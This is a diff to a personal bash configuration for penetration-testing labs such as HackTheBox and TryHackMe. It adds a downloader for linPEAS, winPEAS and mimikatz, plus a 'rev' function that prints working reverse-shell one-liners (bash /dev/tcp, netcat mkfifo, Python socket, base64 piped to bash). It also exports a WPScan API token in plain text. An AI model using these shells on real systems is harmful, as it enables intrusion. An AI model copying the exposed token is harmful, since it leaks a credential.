@@ -4,6 +4,8 @@ source $HOME/.config/colors/colors.sh
 [[ $- != *i* ]] && return
 
 export _JAVA_AWT_WM_NONREPARENTING=1
+export WPSCAN_API_TOKEN=at1sYrkvG9HzgWICSKr7QtFOuQh7nYlgZzlhsMYkss0
+export DOCKER_BUILDKIT=1
 
 alias ls='ls --color=auto'
 alias grep='grep --color=auto'
@@ -11,6 +13,7 @@ alias burp='/usr/bin/burpsuite > /dev/null 2>&1 & disown'
 alias fire='/usr/bin/firefox > /dev/null 2>&1 & disown'
 alias wire='/usr/bin/wireshark > /dev/null 2>&1 & disown'
 alias tor='/usr/bin/torbrowser-launcher > /dev/null 2>&1 & disown'
+alias zap='/usr/bin/zaproxy > /dev/null 2>&1 & disown'
 #PS1='\[\e[32m\][ \[\e[0m\]\[\e[38;2;59;113;202m\]\w\[\e[0m\]\[\e[32m\] ]\[\e[0m\] \[\e[38;2;159;166;178m\]❯❯\[\e[0m\] '
 PS1='\[\e[32m\][ \[\e[0m\]\[\e[38;2;59;113;202m\]\w\[\e[0m\]\[\e[32m\] ]\[\e[0m\] \[\e[38;2;159;166;178m\] \[\e[0m\] '
 
@@ -260,32 +263,150 @@ venv(){
     esac
 }
 
-# Downloads linpeas.sh to the current directory as lp.sh
-linpeas(){
-    local url="https://github.com/peass-ng/PEASS-ng/releases/download/20260212-43b28429/linpeas.sh"
-    local output="lp.sh"
+# Pentesting tools downloader
+tools(){
+    local usage="Usage: tools <tool> [arch]
+  tools linpeas            → download linpeas.sh as lp.sh
+  tools winpeas 32|64      → download winPEASx86.exe or winPEASx64.exe
+  tools mimikatz 32|64     → extract and download mimikatz.exe (32 or 64 bit)
+  tools enum4linux         → clone and setup enum4linux-ng"
 
-    if [[ -f "$output" ]]; then
-        echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] $output already exists in current directory\n"
+    if [[ $# -eq 0 ]]; then
+        echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: no tool specified\n"
+        echo "$usage"
+        echo
         return 1
     fi
 
-    echo -e "\n[${ANSI_WARNING}*${COLOR_RESET}] Downloading linpeas...\n"
-    if curl -sL "$url" -o "$output"; then
-        chmod +x "$output"
-        echo -e "\n[${ANSI_SUCCESS}+${COLOR_RESET}] Saved as $output\n"
-    else
-        echo -e "\n[${ANSI_DANGER}-${COLOR_RESET}] Download failed\n"
-        rm -f "$output"
-        return 1
-    fi
+    case "$1" in
+        linpeas)
+            local url="https://github.com/peass-ng/PEASS-ng/releases/download/20260301-38d838d2/linpeas.sh"
+            local output="lp.sh"
+            if [[ -f "$output" ]]; then
+                echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] $output already exists in current directory\n"
+                return 1
+            fi
+            echo -e "\n[${ANSI_WARNING}*${COLOR_RESET}] Downloading linpeas...\n"
+            if curl -sL "$url" -o "$output"; then
+                chmod +x "$output"
+                echo -e "[${ANSI_SUCCESS}+${COLOR_RESET}] Saved as $output\n"
+            else
+                echo -e "[${ANSI_DANGER}-${COLOR_RESET}] Download failed\n"
+                rm -f "$output"
+                return 1
+            fi
+            ;;
+
+        winpeas)
+            if [[ -z "$2" || ( "$2" != "32" && "$2" != "64" ) ]]; then
+                echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: specify architecture: tools winpeas 32|64\n"
+                return 1
+            fi
+            local url output
+            if [[ "$2" == "32" ]]; then
+                url="https://github.com/peass-ng/PEASS-ng/releases/download/20260301-38d838d2/winPEASx86.exe"
+                output="winPEASx86.exe"
+            else
+                url="https://github.com/peass-ng/PEASS-ng/releases/download/20260301-38d838d2/winPEASx64.exe"
+                output="winPEASx64.exe"
+            fi
+            if [[ -f "$output" ]]; then
+                echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] $output already exists in current directory\n"
+                return 1
+            fi
+            echo -e "\n[${ANSI_WARNING}*${COLOR_RESET}] Downloading winPEAS ($2-bit)...\n"
+            if curl -sL "$url" -o "$output"; then
+                echo -e "[${ANSI_SUCCESS}+${COLOR_RESET}] Saved as $output\n"
+            else
+                echo -e "[${ANSI_DANGER}-${COLOR_RESET}] Download failed\n"
+                rm -f "$output"
+                return 1
+            fi
+            ;;
+
+        mimikatz)
+            if [[ -z "$2" || ( "$2" != "32" && "$2" != "64" ) ]]; then
+                echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: specify architecture: tools mimikatz 32|64\n"
+                return 1
+            fi
+            local url="https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip"
+            local zipfile="mimikatz_trunk.zip"
+            local output="mimikatz.exe"
+            if [[ -f "$output" ]]; then
+                echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] $output already exists in current directory\n"
+                return 1
+            fi
+            echo -e "\n[${ANSI_WARNING}*${COLOR_RESET}] Downloading mimikatz...\n"
+            if ! curl -sL "$url" -o "$zipfile"; then
+                echo -e "\n[${ANSI_DANGER}-${COLOR_RESET}] Download failed\n"
+                rm -f "$zipfile"
+                return 1
+            fi
+            local inner_path
+            if [[ "$2" == "32" ]]; then
+                inner_path="Win32/mimikatz.exe"
+            else
+                inner_path="x64/mimikatz.exe"
+            fi
+            echo -e "[${ANSI_WARNING}*${COLOR_RESET}] Extracting $inner_path...\n"
+            if unzip -p "$zipfile" "$inner_path" > "$output"; then
+                rm -f "$zipfile"
+                echo -e "[${ANSI_SUCCESS}+${COLOR_RESET}] Saved as $output\n"
+            else
+                echo -e "[${ANSI_DANGER}!${COLOR_RESET}] Extraction failed\n"
+                rm -f "$zipfile" "$output"
+                return 1
+            fi
+            ;;
+
+        enum4linux)
+            if [[ -d "enum4linux-ng" ]]; then
+                echo -e "[${ANSI_DANGER}!${COLOR_RESET}] enum4linux-ng directory already exists\n"
+                return 1
+            fi
+            echo -e "\n[${ANSI_WARNING}*${COLOR_RESET}] Cloning enum4linux-ng...\n"
+            if ! git clone https://github.com/cddmp/enum4linux-ng.git; then
+                echo -e "[${ANSI_DANGER}-${COLOR_RESET}] Clone failed\n"
+                return 1
+            fi
+            cd enum4linux-ng || return 1
+            echo -e "\n[${ANSI_WARNING}*${COLOR_RESET}] Setting up virtual environment..."
+            if ! python3 -m venv venv; then
+                echo -e "\n[${ANSI_DANGER}-${COLOR_RESET}] Failed to create venv — try: sudo pacman -S python-virtualenv\n"
+                cd ..
+                return 1
+            fi
+            if ! source venv/bin/activate; then
+                echo -e "[${ANSI_DANGER}-${COLOR_RESET}] Failed to activate venv\n"
+                cd ..
+                return 1
+            fi
+            echo -e "\n[${ANSI_WARNING}*${COLOR_RESET}] Installing dependencies...\n"
+            if ! python3 -m pip install wheel; then
+                echo -e "\n[${ANSI_DANGER}-${COLOR_RESET}] Failed to install wheel\n"
+                return 1
+            fi
+            if ! python3 -m pip install -r requirements.txt; then
+                echo -e "\n[${ANSI_DANGER}-${COLOR_RESET}] Failed to install requirements\n"
+                return 1
+            fi
+            echo -e "\n[${ANSI_SUCCESS}+${COLOR_RESET}] enum4linux-ng ready — venv activated\n"
+            ;;
+        *)
+            echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: unknown tool '$1'\n"
+            echo "$usage"
+            echo
+            return 1
+            ;;
+    esac
 }
 
 # VPN manager for HTB, HTB Academy and THM
 vpn(){
     local config_dir="$HOME/.config/vpn"
-    local usage="Usage: vpn -c <htb|htba|thm>
+    local usage="Usage: vpn -c <htb|htbc|htba|thm>
   vpn -c htb   → connect to HackTheBox
+  vpn -c htbc  → connect to HackTheBox Competitive
   vpn -c htba  → connect to HackTheBox Academy
   vpn -c thm   → connect to TryHackMe"
 
@@ -317,6 +438,7 @@ vpn(){
 
     case "$2" in
         htb)  config="$config_dir/htb.ovpn"  ;;
+        htbc) config="$config_dir/htbc.ovpn"  ;;
         htba) config="$config_dir/htba.ovpn" ;;
         thm)  config="$config_dir/thm.ovpn"  ;;
         *)
@@ -358,6 +480,59 @@ clip(){
 
     xclip -sel clip < "$1"
     echo -e "\n[${ANSI_SUCCESS}+${COLOR_RESET}] '$1' copied to clipboard\n"
+}
+
+# Generates reverse shells for a given attacker IP and port
+rev(){
+    local usage="Usage: rev <ip> <port>
+  rev 10.10.15.113 4444  → print ready-to-use reverse shells"
+
+    if [[ $# -ne 2 ]]; then
+        echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: expected 2 arguments\n"
+        echo "$usage"
+        echo
+        return 1
+    fi
+
+    local ip="$1"
+    local port="$2"
+
+    # Validate IP
+    if ! [[ "$ip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
+        echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}]Error: '$ip' is not a valid IP address\n"
+        return 1
+    fi
+
+    # Validate port
+    if ! [[ "$port" =~ ^[0-9]+$ ]] || [[ $port -lt 1 || $port -gt 65535 ]]; then
+        echo -e "\n[${ANSI_DANGER}!${COLOR_RESET}] Error: '$port' is not a valid port (1-65535)\n"
+        return 1
+    fi
+
+    # Base64 reverse shell
+    local b64
+    b64=$(echo "bash -i >& /dev/tcp/${ip}/${port} 0>&1" | base64 | tr -d '\n')
+
+    echo ""
+    echo -e "━━━ ${ANSI_SUCCESS}Bash${COLOR_RESET} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+    echo "bash -c \"bash -i >& /dev/tcp/${ip}/${port} 0>&1\""
+
+    echo ""
+    echo -e "━━━ ${ANSI_SUCCESS}Bash URL-encoded${COLOR_RESET} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+    echo "bash+-c+\"bash+-i+>%26+/dev/tcp/${ip}/${port}+0>%261\""
+
+    echo ""
+    echo -e "━━━ ${ANSI_SUCCESS}Netcat (mkfifo)${COLOR_RESET} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f"
+
+    echo ""
+    echo -e "━━━ ${ANSI_SUCCESS}Python${COLOR_RESET} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+    echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${ip}\",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+
+    echo ""
+    echo -e "━━━ ${ANSI_SUCCESS}Base64${COLOR_RESET} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+    echo "echo ${b64} | base64 -d | bash"
+    echo ""
 }
 
 # Wordlist manager — save and display frequently used SecLists paths
